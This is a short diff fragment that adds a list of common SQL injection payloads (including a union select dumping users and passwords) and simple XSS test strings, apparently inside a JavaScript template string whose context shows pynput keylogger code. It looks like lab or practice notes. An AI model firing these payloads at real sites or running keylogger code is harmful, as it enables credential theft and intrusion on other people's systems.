@@ -30,6 +30,17 @@ def on_press(key):
 #this says,Listener is on
 with Listener(on_press=on_press)as listener:
  listener.join()
+1' or 1=1#
+1' order by 2#
+1’ union select null,database()#
+1’ union select null,version()#
+1’ union select user, password from users#
+crack station
+r
+<script>alert("hiiii guys")</script>
+<script>document.cookie</script>
+<img src=”nosrc” onerror=”alert(“HELLO”)”/>
+
 `);
 
   },[]);
